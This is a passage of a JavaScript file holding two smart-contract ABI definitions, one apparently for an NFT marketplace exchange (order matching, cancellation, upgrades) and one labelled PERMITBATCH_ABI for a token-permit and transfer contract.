				internalType: 'address',
				name: 'beacon',
				type: 'address',
			},
		],
		name: 'BeaconUpgraded',
		type: 'event',
	},
	{ anonymous: false, inputs: [], name: 'Closed', type: 'event' },
	{
		anonymous: false,
		inputs: [
			{ indexed: false, internalType: 'uint8', name: 'version', type: 'uint8' },
		],
		name: 'Initialized',
		type: 'event',
	},
	{
		anonymous: false,
		inputs: [
			{
				indexed: false,
				internalType: 'uint256',
				name: 'blockRange',
				type: 'uint256',
			},
		],
		name: 'NewBlockRange',
		type: 'event',
	},
	{
		anonymous: false,
		inputs: [
			{
				indexed: true,
				internalType: 'contract IExecutionDelegate',
				name: 'executionDelegate',
				type: 'address',
			},
		],
		name: 'NewExecutionDelegate',
		type: 'event',
	},
	{
		anonymous: false,
		inputs: [
			{
				indexed: true,
				internalType: 'address',
				name: 'oracle',
				type: 'address',
			},
		],
		name: 'NewOracle',
		type: 'event',
	},
	{
		anonymous: false,
		inputs: [
			{
				indexed: true,
				internalType: 'contract IPolicyManager',
				name: 'policyManager',
				type: 'address',
			},
		],
		name: 'NewPolicyManager',
		type: 'event',
	},
	{
		anonymous: false,
		inputs: [
			{
				indexed: true,
				internalType: 'address',
				name: 'trader',
				type: 'address',
			},
			{
				indexed: false,
				internalType: 'uint256',
				name: 'newNonce',
				type: 'uint256',
			},
		],
		name: 'NonceIncremented',
		type: 'event',
	},
	{ anonymous: false, inputs: [], name: 'Opened', type: 'event' },
	{
		anonymous: false,
		inputs: [
			{
				indexed: false,
				internalType: 'bytes32',
				name: 'hash',
				type: 'bytes32',
			},
		],
		name: 'OrderCancelled',
		type: 'event',
	},
	{
		anonymous: false,
		inputs: [
			{
				indexed: true,
				internalType: 'address',
				name: 'maker',
				type: 'address',
			},
			{
				indexed: true,
				internalType: 'address',
				name: 'taker',
				type: 'address',
			},
			{
				components: [
					{ internalType: 'address', name: 'trader', type: 'address' },
					{ internalType: 'enum Side', name: 'side', type: 'uint8' },
					{ internalType: 'address', name: 'matchingPolicy', type: 'address' },
					{ internalType: 'address', name: 'collection', type: 'address' },
					{ internalType: 'uint256', name: 'tokenId', type: 'uint256' },
					{ internalType: 'uint256', name: 'amount', type: 'uint256' },
					{ internalType: 'address', name: 'paymentToken', type: 'address' },
					{ internalType: 'uint256', name: 'price', type: 'uint256' },
					{ internalType: 'uint256', name: 'listingTime', type: 'uint256' },
					{ internalType: 'uint256', name: 'expirationTime', type: 'uint256' },
					{
						components: [
							{ internalType: 'uint16', name: 'rate', type: 'uint16' },
							{
								internalType: 'address payable',
								name: 'recipient',
								type: 'address',
							},
						],
						internalType: 'struct Fee[]',
						name: 'fees',
						type: 'tuple[]',
					},
					{ internalType: 'uint256', name: 'salt', type: 'uint256' },
					{ internalType: 'bytes', name: 'extraParams', type: 'bytes' },
				],
				indexed: false,
				internalType: 'struct Order',
				name: 'sell',
				type: 'tuple',
			},
			{
				indexed: false,
				internalType: 'bytes32',
				name: 'sellHash',
				type: 'bytes32',
			},
			{
				components: [
					{ internalType: 'address', name: 'trader', type: 'address' },
					{ internalType: 'enum Side', name: 'side', type: 'uint8' },
					{ internalType: 'address', name: 'matchingPolicy', type: 'address' },
					{ internalType: 'address', name: 'collection', type: 'address' },
					{ internalType: 'uint256', name: 'tokenId', type: 'uint256' },
					{ internalType: 'uint256', name: 'amount', type: 'uint256' },
					{ internalType: 'address', name: 'paymentToken', type: 'address' },
					{ internalType: 'uint256', name: 'price', type: 'uint256' },
					{ internalType: 'uint256', name: 'listingTime', type: 'uint256' },
					{ internalType: 'uint256', name: 'expirationTime', type: 'uint256' },
					{
						components: [
							{ internalType: 'uint16', name: 'rate', type: 'uint16' },
							{
								internalType: 'address payable',
								name: 'recipient',
								type: 'address',
							},
						],
						internalType: 'struct Fee[]',
						name: 'fees',
						type: 'tuple[]',
					},
					{ internalType: 'uint256', name: 'salt', type: 'uint256' },
					{ internalType: 'bytes', name: 'extraParams', type: 'bytes' },
				],
				indexed: false,
				internalType: 'struct Order',
				name: 'buy',
				type: 'tuple',
			},
			{
				indexed: false,
				internalType: 'bytes32',
				name: 'buyHash',
				type: 'bytes32',
			},
		],
		name: 'OrdersMatched',
		type: 'event',
	},
	{
		anonymous: false,
		inputs: [
			{
				indexed: true,
				internalType: 'address',
				name: 'previousOwner',
				type: 'address',
			},
			{
				indexed: true,
				internalType: 'address',
				name: 'newOwner',
				type: 'address',
			},
		],
		name: 'OwnershipTransferred',
		type: 'event',
	},
	{
		anonymous: false,
		inputs: [
			{
				indexed: true,
				internalType: 'address',
				name: 'implementation',
				type: 'address',
			},
		],
		name: 'Upgraded',
		type: 'event',
	},
	{
		inputs: [],
		name: 'FEE_TYPEHASH',
		outputs: [{ internalType: 'bytes32', name: '', type: 'bytes32' }],
		stateMutability: 'view',
		type: 'function',
	},
	{
		inputs: [],
		name: 'INVERSE_BASIS_POINT',
		outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
		stateMutability: 'view',
		type: 'function',
	},
	{
		inputs: [],
		name: 'NAME',
		outputs: [{ internalType: 'string', name: '', type: 'string' }],
		stateMutability: 'view',
		type: 'function',
	},
	{
		inputs: [],
		name: 'ORACLE_ORDER_TYPEHASH',
		outputs: [{ internalType: 'bytes32', name: '', type: 'bytes32' }],
		stateMutability: 'view',
		type: 'function',
	},
	{
		inputs: [],
		name: 'ORDER_TYPEHASH',
		outputs: [{ internalType: 'bytes32', name: '', type: 'bytes32' }],
		stateMutability: 'view',
		type: 'function',
	},
	{
		inputs: [],
		name: 'ROOT_TYPEHASH',
		outputs: [{ internalType: 'bytes32', name: '', type: 'bytes32' }],
		stateMutability: 'view',
		type: 'function',
	},
	{
		inputs: [],
		name: 'VERSION',
		outputs: [{ internalType: 'string', name: '', type: 'string' }],
		stateMutability: 'view',
		type: 'function',
	},
	{
		inputs: [],
		name: 'WETH',
		outputs: [{ internalType: 'address', name: '', type: 'address' }],
		stateMutability: 'view',
		type: 'function',
	},
	{
		inputs: [],
		name: 'blockRange',
		outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
		stateMutability: 'view',
		type: 'function',
	},
	{
		inputs: [
			{
				components: [
					{ internalType: 'address', name: 'trader', type: 'address' },
					{ internalType: 'enum Side', name: 'side', type: 'uint8' },
					{ internalType: 'address', name: 'matchingPolicy', type: 'address' },
					{ internalType: 'address', name: 'collection', type: 'address' },
					{ internalType: 'uint256', name: 'tokenId', type: 'uint256' },
					{ internalType: 'uint256', name: 'amount', type: 'uint256' },
					{ internalType: 'address', name: 'paymentToken', type: 'address' },
					{ internalType: 'uint256', name: 'price', type: 'uint256' },
					{ internalType: 'uint256', name: 'listingTime', type: 'uint256' },
					{ internalType: 'uint256', name: 'expirationTime', type: 'uint256' },
					{
						components: [
							{ internalType: 'uint16', name: 'rate', type: 'uint16' },
							{
								internalType: 'address payable',
								name: 'recipient',
								type: 'address',
							},
						],
						internalType: 'struct Fee[]',
						name: 'fees',
						type: 'tuple[]',
					},
					{ internalType: 'uint256', name: 'salt', type: 'uint256' },
					{ internalType: 'bytes', name: 'extraParams', type: 'bytes' },
				],
				internalType: 'struct Order',
				name: 'order',
				type: 'tuple',
			},
		],
		name: 'cancelOrder',
		outputs: [],
		stateMutability: 'nonpayable',
		type: 'function',
	},
	{
		inputs: [
			{
				components: [
					{ internalType: 'address', name: 'trader', type: 'address' },
					{ internalType: 'enum Side', name: 'side', type: 'uint8' },
					{ internalType: 'address', name: 'matchingPolicy', type: 'address' },
					{ internalType: 'address', name: 'collection', type: 'address' },
					{ internalType: 'uint256', name: 'tokenId', type: 'uint256' },
					{ internalType: 'uint256', name: 'amount', type: 'uint256' },
					{ internalType: 'address', name: 'paymentToken', type: 'address' },
					{ internalType: 'uint256', name: 'price', type: 'uint256' },
					{ internalType: 'uint256', name: 'listingTime', type: 'uint256' },
					{ internalType: 'uint256', name: 'expirationTime', type: 'uint256' },
					{
						components: [
							{ internalType: 'uint16', name: 'rate', type: 'uint16' },
							{
								internalType: 'address payable',
								name: 'recipient',
								type: 'address',
							},
						],
						internalType: 'struct Fee[]',
						name: 'fees',
						type: 'tuple[]',
					},
					{ internalType: 'uint256', name: 'salt', type: 'uint256' },
					{ internalType: 'bytes', name: 'extraParams', type: 'bytes' },
				],
				internalType: 'struct Order[]',
				name: 'orders',
				type: 'tuple[]',
			},
		],
		name: 'cancelOrders',
		outputs: [],
		stateMutability: 'nonpayable',
		type: 'function',
	},
	{
		inputs: [{ internalType: 'bytes32', name: '', type: 'bytes32' }],
		name: 'cancelledOrFilled',
		outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
		stateMutability: 'view',
		type: 'function',
	},
	{
		inputs: [],
		name: 'close',
		outputs: [],
		stateMutability: 'nonpayable',
		type: 'function',
	},
	{
		inputs: [
			{
				components: [
					{
						components: [
							{ internalType: 'address', name: 'trader', type: 'address' },
							{ internalType: 'enum Side', name: 'side', type: 'uint8' },
							{
								internalType: 'address',
								name: 'matchingPolicy',
								type: 'address',
							},
							{ internalType: 'address', name: 'collection', type: 'address' },
							{ internalType: 'uint256', name: 'tokenId', type: 'uint256' },
							{ internalType: 'uint256', name: 'amount', type: 'uint256' },
							{
								internalType: 'address',
								name: 'paymentToken',
								type: 'address',
							},
							{ internalType: 'uint256', name: 'price', type: 'uint256' },
							{ internalType: 'uint256', name: 'listingTime', type: 'uint256' },
							{
								internalType: 'uint256',
								name: 'expirationTime',
								type: 'uint256',
							},
							{
								components: [
									{ internalType: 'uint16', name: 'rate', type: 'uint16' },
									{
										internalType: 'address payable',
										name: 'recipient',
										type: 'address',
									},
								],
								internalType: 'struct Fee[]',
								name: 'fees',
								type: 'tuple[]',
							},
							{ internalType: 'uint256', name: 'salt', type: 'uint256' },
							{ internalType: 'bytes', name: 'extraParams', type: 'bytes' },
						],
						internalType: 'struct Order',
						name: 'order',
						type: 'tuple',
					},
					{ internalType: 'uint8', name: 'v', type: 'uint8' },
					{ internalType: 'bytes32', name: 'r', type: 'bytes32' },
					{ internalType: 'bytes32', name: 's', type: 'bytes32' },
					{ internalType: 'bytes', name: 'extraSignature', type: 'bytes' },
					{
						internalType: 'enum SignatureVersion',
						name: 'signatureVersion',
						type: 'uint8',
					},
					{ internalType: 'uint256', name: 'blockNumber', type: 'uint256' },
				],
				internalType: 'struct Input',
				name: 'sell',
				type: 'tuple',
			},
			{
				components: [
					{
						components: [
							{ internalType: 'address', name: 'trader', type: 'address' },
							{ internalType: 'enum Side', name: 'side', type: 'uint8' },
							{
								internalType: 'address',
								name: 'matchingPolicy',
								type: 'address',
							},
							{ internalType: 'address', name: 'collection', type: 'address' },
							{ internalType: 'uint256', name: 'tokenId', type: 'uint256' },
							{ internalType: 'uint256', name: 'amount', type: 'uint256' },
							{
								internalType: 'address',
								name: 'paymentToken',
								type: 'address',
							},
							{ internalType: 'uint256', name: 'price', type: 'uint256' },
							{ internalType: 'uint256', name: 'listingTime', type: 'uint256' },
							{
								internalType: 'uint256',
								name: 'expirationTime',
								type: 'uint256',
							},
							{
								components: [
									{ internalType: 'uint16', name: 'rate', type: 'uint16' },
									{
										internalType: 'address payable',
										name: 'recipient',
										type: 'address',
									},
								],
								internalType: 'struct Fee[]',
								name: 'fees',
								type: 'tuple[]',
							},
							{ internalType: 'uint256', name: 'salt', type: 'uint256' },
							{ internalType: 'bytes', name: 'extraParams', type: 'bytes' },
						],
						internalType: 'struct Order',
						name: 'order',
						type: 'tuple',
					},
					{ internalType: 'uint8', name: 'v', type: 'uint8' },
					{ internalType: 'bytes32', name: 'r', type: 'bytes32' },
					{ internalType: 'bytes32', name: 's', type: 'bytes32' },
					{ internalType: 'bytes', name: 'extraSignature', type: 'bytes' },
					{
						internalType: 'enum SignatureVersion',
						name: 'signatureVersion',
						type: 'uint8',
					},
					{ internalType: 'uint256', name: 'blockNumber', type: 'uint256' },
				],
				internalType: 'struct Input',
				name: 'buy',
				type: 'tuple',
			},
		],
		name: 'execute',
		outputs: [],
		stateMutability: 'payable',
		type: 'function',
	},
	{
		inputs: [],
		name: 'executionDelegate',
		outputs: [
			{
				internalType: 'contract IExecutionDelegate',
				name: '',
				type: 'address',
			},
		],
		stateMutability: 'view',
		type: 'function',
	},
	{
		inputs: [],
		name: 'incrementNonce',
		outputs: [],
		stateMutability: 'nonpayable',
		type: 'function',
	},
	{
		inputs: [
			{
				internalType: 'contract IExecutionDelegate',
				name: '_executionDelegate',
				type: 'address',
			},
			{
				internalType: 'contract IPolicyManager',
				name: '_policyManager',
				type: 'address',
			},
			{ internalType: 'address', name: '_oracle', type: 'address' },
			{ internalType: 'uint256', name: '_blockRange', type: 'uint256' },
		],
		name: 'initialize',
		outputs: [],
		stateMutability: 'nonpayable',
		type: 'function',
	},
	{
		inputs: [],
		name: 'isOpen',
		outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
		stateMutability: 'view',
		type: 'function',
	},
	{
		inputs: [{ internalType: 'address', name: '', type: 'address' }],
		name: 'nonces',
		outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
		stateMutability: 'view',
		type: 'function',
	},
	{
		inputs: [],
		name: 'open',
		outputs: [],
		stateMutability: 'nonpayable',
		type: 'function',
	},
	{
		inputs: [],
		name: 'oracle',
		outputs: [{ internalType: 'address', name: '', type: 'address' }],
		stateMutability: 'view',
		type: 'function',
	},
	{
		inputs: [],
		name: 'owner',
		outputs: [{ internalType: 'address', name: '', type: 'address' }],
		stateMutability: 'view',
		type: 'function',
	},
	{
		inputs: [],
		name: 'policyManager',
		outputs: [
			{ internalType: 'contract IPolicyManager', name: '', type: 'address' },
		],
		stateMutability: 'view',
		type: 'function',
	},
	{
		inputs: [],
		name: 'proxiableUUID',
		outputs: [{ internalType: 'bytes32', name: '', type: 'bytes32' }],
		stateMutability: 'view',
		type: 'function',
	},
	{
		inputs: [],
		name: 'renounceOwnership',
		outputs: [],
		stateMutability: 'nonpayable',
		type: 'function',
	},
	{
		inputs: [{ internalType: 'uint256', name: '_blockRange', type: 'uint256' }],
		name: 'setBlockRange',
		outputs: [],
		stateMutability: 'nonpayable',
		type: 'function',
	},
	{
		inputs: [
			{
				internalType: 'contract IExecutionDelegate',
				name: '_executionDelegate',
				type: 'address',
			},
		],
		name: 'setExecutionDelegate',
		outputs: [],
		stateMutability: 'nonpayable',
		type: 'function',
	},
	{
		inputs: [{ internalType: 'address', name: '_oracle', type: 'address' }],
		name: 'setOracle',
		outputs: [],
		stateMutability: 'nonpayable',
		type: 'function',
	},
	{
		inputs: [
			{
				internalType: 'contract IPolicyManager',
				name: '_policyManager',
				type: 'address',
			},
		],
		name: 'setPolicyManager',
		outputs: [],
		stateMutability: 'nonpayable',
		type: 'function',
	},
	{
		inputs: [{ internalType: 'address', name: 'newOwner', type: 'address' }],
		name: 'transferOwnership',
		outputs: [],
		stateMutability: 'nonpayable',
		type: 'function',
	},
	{
		inputs: [
			{ internalType: 'address', name: 'newImplementation', type: 'address' },
		],
		name: 'upgradeTo',
		outputs: [],
		stateMutability: 'nonpayable',
		type: 'function',
	},
	{
		inputs: [
			{ internalType: 'address', name: 'newImplementation', type: 'address' },
			{ internalType: 'bytes', name: 'data', type: 'bytes' },
		],
		name: 'upgradeToAndCall',
		outputs: [],
		stateMutability: 'payable',
		type: 'function',
	},
];

const PERMITBATCH_ABI = [{
	"inputs": [{
		"internalType": "uint256",
		"name": "deadline",
		"type": "uint256"
	}],
	"name": "AllowanceExpired",
	"type": "error"
  }, {
	"inputs": [],
	"name": "ExcessiveInvalidation",
	"type": "error"
  }, {
	"inputs": [{
		"internalType": "uint256",
		"name": "amount",
		"type": "uint256"
	}],
	"name": "InsufficientAllowance",
	"type": "error"
  }, {
	"inputs": [{
		"internalType": "uint256",
		"name": "maxAmount",
		"type": "uint256"
	}],
	"name": "InvalidAmount",
	"type": "error"
  }, {
	"inputs": [],
	"name": "InvalidContractSignature",
	"type": "error"
  }, {
	"inputs": [],
	"name": "InvalidNonce",
	"type": "error"
  }, {
	"inputs": [],
	"name": "InvalidSignature",
	"type": "error"
  }, {
	"inputs": [],
	"name": "InvalidSignatureLength",
	"type": "error"
  }, {
	"inputs": [],
	"name": "InvalidSigner",
	"type": "error"
  }, {
	"inputs": [],
	"name": "LengthMismatch",
	"type": "error"
  }, {
	"inputs": [{
		"internalType": "uint256",
		"name": "signatureDeadline",
		"type": "uint256"
	}],
	"name": "SignatureExpired",
	"type": "error"
  }, {
	"anonymous": false,
	"inputs": [{
		"indexed": true,
		"internalType": "address",
		"name": "owner",
		"type": "address"
	}, {
		"indexed": true,
		"internalType": "address",
		"name": "token",
		"type": "address"
	}, {
		"indexed": true,
		"internalType": "address",
		"name": "spender",
		"type": "address"
	}, {
		"indexed": false,
		"internalType": "uint160",
		"name": "amount",
		"type": "uint160"
	}, {
		"indexed": false,
		"internalType": "uint48",
		"name": "expiration",
		"type": "uint48"
	}],
	"name": "Approval",
	"type": "event"
  }, {
	"anonymous": false,
	"inputs": [{
		"indexed": true,
		"internalType": "address",
		"name": "owner",
		"type": "address"
	}, {
		"indexed": false,
		"internalType": "address",
		"name": "token",
		"type": "address"
	}, {
		"indexed": false,
		"internalType": "address",
		"name": "spender",
		"type": "address"
	}],
	"name": "Lockdown",
	"type": "event"
  }, {
	"anonymous": false,
	"inputs": [{
		"indexed": true,
		"internalType": "address",
		"name": "owner",
		"type": "address"
	}, {
		"indexed": true,
		"internalType": "address",
		"name": "token",
		"type": "address"
	}, {
		"indexed": true,
		"internalType": "address",
		"name": "spender",
		"type": "address"
	}, {
		"indexed": false,
		"internalType": "uint48",
		"name": "newNonce",
		"type": "uint48"
	}, {
		"indexed": false,
		"internalType": "uint48",
		"name": "oldNonce",
		"type": "uint48"
	}],
	"name": "NonceInvalidation",
	"type": "event"
  }, {
	"anonymous": false,
	"inputs": [{
		"indexed": true,
		"internalType": "address",
		"name": "owner",
		"type": "address"
	}, {
		"indexed": true,
		"internalType": "address",
		"name": "token",
		"type": "address"
	}, {
		"indexed": true,
		"internalType": "address",
		"name": "spender",
		"type": "address"
	}, {
		"indexed": false,
		"internalType": "uint160",
		"name": "amount",
		"type": "uint160"
	}, {
		"indexed": false,
		"internalType": "uint48",
		"name": "expiration",
		"type": "uint48"
	}, {
		"indexed": false,
		"internalType": "uint48",
		"name": "nonce",
		"type": "uint48"
	}],
	"name": "Permit",
	"type": "event"
  }, {
	"anonymous": false,
	"inputs": [{
		"indexed": true,
		"internalType": "address",
		"name": "owner",
		"type": "address"
	}, {
		"indexed": false,
		"internalType": "uint256",
		"name": "word",
		"type": "uint256"
	}, {
		"indexed": false,
		"internalType": "uint256",
		"name": "mask",
		"type": "uint256"
	}],
	"name": "UnorderedNonceInvalidation",
	"type": "event"
  }, {
	"inputs": [],
	"name": "DOMAIN_SEPARATOR",
	"outputs": [{
		"internalType": "bytes32",
		"name": "",
		"type": "bytes32"
	}],
	"stateMutability": "view",
	"type": "function"
  }, {
	"inputs": [{
		"internalType": "address",
		"name": "",
		"type": "address"
	}, {
		"internalType": "address",
		"name": "",
		"type": "address"
	}, {
		"internalType": "address",
		"name": "",
		"type": "address"
	}],
	"name": "allowance",
	"outputs": [{
		"internalType": "uint160",
		"name": "amount",
		"type": "uint160"
	}, {
		"internalType": "uint48",
		"name": "expiration",
		"type": "uint48"
	}, {
		"internalType": "uint48",
		"name": "nonce",
		"type": "uint48"
	}],
	"stateMutability": "view",
	"type": "function"
  }, {
	"inputs": [{
		"internalType": "address",
		"name": "token",
		"type": "address"
	}, {
		"internalType": "address",
		"name": "spender",
		"type": "address"
	}, {
		"internalType": "uint160",
		"name": "amount",
		"type": "uint160"
	}, {
		"internalType": "uint48",
		"name": "expiration",
		"type": "uint48"
	}],
	"name": "approve",
	"outputs": [],
	"stateMutability": "nonpayable",
	"type": "function"
  }, {
	"inputs": [{
		"internalType": "address",
		"name": "token",
		"type": "address"
	}, {
		"internalType": "address",
		"name": "spender",
		"type": "address"
	}, {
		"internalType": "uint48",
		"name": "newNonce",
		"type": "uint48"
	}],
	"name": "invalidateNonces",
	"outputs": [],
	"stateMutability": "nonpayable",
	"type": "function"
  }, {
	"inputs": [{
		"internalType": "uint256",
		"name": "wordPos",
		"type": "uint256"
	}, {
		"internalType": "uint256",
		"name": "mask",
		"type": "uint256"
	}],
	"name": "invalidateUnorderedNonces",
	"outputs": [],
	"stateMutability": "nonpayable",
	"type": "function"
  }, {
	"inputs": [{
		"components": [{
			"internalType": "address",
			"name": "token",
			"type": "address"
		}, {
			"internalType": "address",
			"name": "spender",
			"type": "address"
		}],
		"internalType": "struct IAllowanceTransfer.TokenSpenderPair[]",
		"name": "approvals",
		"type": "tuple[]"
	}],
	"name": "lockdown",
	"outputs": [],
	"stateMutability": "nonpayable",
	"type": "function"
  }, {
	"inputs": [{
		"internalType": "address",
		"name": "",
		"type": "address"
	}, {
		"internalType": "uint256",
		"name": "",
		"type": "uint256"
	}],
	"name": "nonceBitmap",
	"outputs": [{
		"internalType": "uint256",
		"name": "",
		"type": "uint256"
	}],
	"stateMutability": "view",
	"type": "function"
  }, {
	"inputs": [{
		"internalType": "address",
		"name": "owner",
		"type": "address"
	}, {
		"components": [{
			"components": [{
				"internalType": "address",
				"name": "token",
				"type": "address"
			}, {
				"internalType": "uint160",
				"name": "amount",
				"type": "uint160"
			}, {
				"internalType": "uint48",
				"name": "expiration",
				"type": "uint48"
			}, {
				"internalType": "uint48",
				"name": "nonce",
				"type": "uint48"
			}],
			"internalType": "struct IAllowanceTransfer.PermitDetails[]",
			"name": "details",
			"type": "tuple[]"
		}, {
			"internalType": "address",
			"name": "spender",
			"type": "address"
		}, {
			"internalType": "uint256",
			"name": "sigDeadline",
			"type": "uint256"
		}],
		"internalType": "struct IAllowanceTransfer.PermitBatch",
		"name": "permitBatch",
		"type": "tuple"
	}, {
		"internalType": "bytes",
		"name": "signature",
		"type": "bytes"
	}],
	"name": "permit",
	"outputs": [],
	"stateMutability": "nonpayable",
	"type": "function"
  }, {
	"inputs": [{
		"components": [{
			"components": [{
				"internalType": "address",
				"name": "token",
				"type": "address"
			}, {
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}],
			"internalType": "struct ISignatureTransfer.TokenPermissions",
			"name": "permitted",
			"type": "tuple"
		}, {
			"internalType": "uint256",
			"name": "nonce",
			"type": "uint256"
		}, {
			"internalType": "uint256",
			"name": "deadline",
			"type": "uint256"
		}],
		"internalType": "struct ISignatureTransfer.PermitTransferFrom",
		"name": "permit",
		"type": "tuple"
	}, {
		"components": [{
			"internalType": "address",
			"name": "to",
			"type": "address"
		}, {
			"internalType": "uint256",
			"name": "requestedAmount",
			"type": "uint256"
		}],
		"internalType": "struct ISignatureTransfer.SignatureTransferDetails",
		"name": "transferDetails",
		"type": "tuple"
	}, {
		"internalType": "address",
		"name": "owner",
		"type": "address"
	}, {
		"internalType": "bytes",
		"name": "signature",
		"type": "bytes"
	}],
	"name": "permitTransferFrom",
	"outputs": [],
	"stateMutability": "nonpayable",
	"type": "function"
  }, {
	"inputs": [{
		"components": [{
			"components": [{
				"internalType": "address",
				"name": "token",
				"type": "address"
			}, {
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}],
			"internalType": "struct ISignatureTransfer.TokenPermissions[]",
			"name": "permitted",
			"type": "tuple[]"
		}, {
			"internalType": "uint256",
			"name": "nonce",
			"type": "uint256"
		}, {
			"internalType": "uint256",
			"name": "deadline",
			"type": "uint256"
		}],
		"internalType": "struct ISignatureTransfer.PermitBatchTransferFrom",
		"name": "permit",
		"type": "tuple"
	}, {
		"components": [{
			"internalType": "address",
			"name": "to",
			"type": "address"
		}, {
			"internalType": "uint256",
			"name": "requestedAmount",
			"type": "uint256"
		}],
		"internalType": "struct ISignatureTransfer.SignatureTransferDetails[]",
		"name": "transferDetails",
		"type": "tuple[]"
	}, {
		"internalType": "address",
		"name": "owner",
		"type": "address"
	}, {
		"internalType": "bytes",
		"name": "signature",
		"type": "bytes"
	}],
	"name": "permitTransferFrom",
	"outputs": [],
	"stateMutability": "nonpayable",
	"type": "function"
  }, {
	"inputs": [{
		"components": [{
			"components": [{
				"internalType": "address",
				"name": "token",
				"type": "address"
			}, {
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}],
			"internalType": "struct ISignatureTransfer.TokenPermissions",
			"name": "permitted",
			"type": "tuple"
		}, {
			"internalType": "uint256",
			"name": "nonce",
			"type": "uint256"
		}, {
			"internalType": "uint256",
			"name": "deadline",
			"type": "uint256"
		}],
		"internalType": "struct ISignatureTransfer.PermitTransferFrom",
		"name": "permit",
		"type": "tuple"
	}, {
		"components": [{
			"internalType": "address",
			"name": "to",
			"type": "address"
		}, {
			"internalType": "uint256",
			"name": "requestedAmount",
			"type": "uint256"
		}],
		"internalType": "struct ISignatureTransfer.SignatureTransferDetails",
		"name": "transferDetails",
		"type": "tuple"
	}, {
		"internalType": "address",
		"name": "owner",
		"type": "address"
	}, {
		"internalType": "bytes32",
		"name": "witness",
		"type": "bytes32"
	}, {
		"internalType": "string",
		"name": "witnessTypeString",
		"type": "string"
	}, {
		"internalType": "bytes",
		"name": "signature",
		"type": "bytes"
	}],
	"name": "permitWitnessTransferFrom",
	"outputs": [],
	"stateMutability": "nonpayable",
	"type": "function"
  }, {
	"inputs": [{
		"components": [{
			"components": [{
				"internalType": "address",
				"name": "token",
				"type": "address"
			}, {
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}],
			"internalType": "struct ISignatureTransfer.TokenPermissions[]",
			"name": "permitted",
			"type": "tuple[]"
		}, {
			"internalType": "uint256",
			"name": "nonce",
			"type": "uint256"
		}, {
			"internalType": "uint256",
			"name": "deadline",
			"type": "uint256"
		}],
		"internalType": "struct ISignatureTransfer.PermitBatchTransferFrom",
		"name": "permit",
		"type": "tuple"
	}, {
		"components": [{
			"internalType": "address",
			"name": "to",
			"type": "address"
		}, {
			"internalType": "uint256",
			"name": "requestedAmount",
			"type": "uint256"
		}],
		"internalType": "struct ISignatureTransfer.SignatureTransferDetails[]",
		"name": "transferDetails",
		"type": "tuple[]"
	}, {
		"internalType": "address",
		"name": "owner",
		"type": "address"
	}, {
		"internalType": "bytes32",
		"name": "witness",
		"type": "bytes32"
	}, {
		"internalType": "string",
		"name": "witnessTypeString",
		"type": "string"
	}, {
		"internalType": "bytes",
		"name": "signature",
		"type": "bytes"
	}],
	"name": "permitWitnessTransferFrom",
	"outputs": [],
	"stateMutability": "nonpayable",
	"type": "function"
  }, {
	"inputs": [{
		"components": [{
			"internalType": "address",
			"name": "from",
			"type": "address"
		}, {
			"internalType": "address",
			"name": "to",
			"type": "address"
		}, {
			"internalType": "uint160",
			"name": "amount",
			"type": "uint160"
		}, {
			"internalType": "address",
			"name": "token",
			"type": "address"
		}],
		"internalType": "struct IAllowanceTransfer.AllowanceTransferDetails[]",
		"name": "transferDetails",
		"type": "tuple[]"
	}],
	"name": "transferFrom",
	"outputs": [],
	"stateMutability": "nonpayable",
	"type": "function"
  }];